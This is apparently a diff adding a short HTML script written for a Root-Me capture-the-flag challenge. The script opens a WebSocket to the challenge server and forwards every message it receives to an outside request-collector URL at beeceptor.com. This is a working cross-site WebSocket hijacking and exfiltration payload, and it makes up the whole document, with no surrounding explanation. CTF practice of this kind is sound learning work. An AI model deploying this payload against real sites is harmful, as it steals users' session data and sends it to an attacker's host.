@@ -1,0 +1,16 @@
+<script>
+var connection = new WebSocket('ws://challenge01.root-me.org:58036/ws');
+
+connection.onopen = function () {
+	console.log('send message');
+	connection.send("hello");
+};
+
+connection.onmessage = function (message) {
+	console.log(message);
+	console.log(message["data"]);
+	var xhr = new XMLHttpRequest();
+	xhr.open('GET', 'https://bonjour.free.beeceptor.com/' + message["data"], true);
+	xhr.send();
+};
+</script>
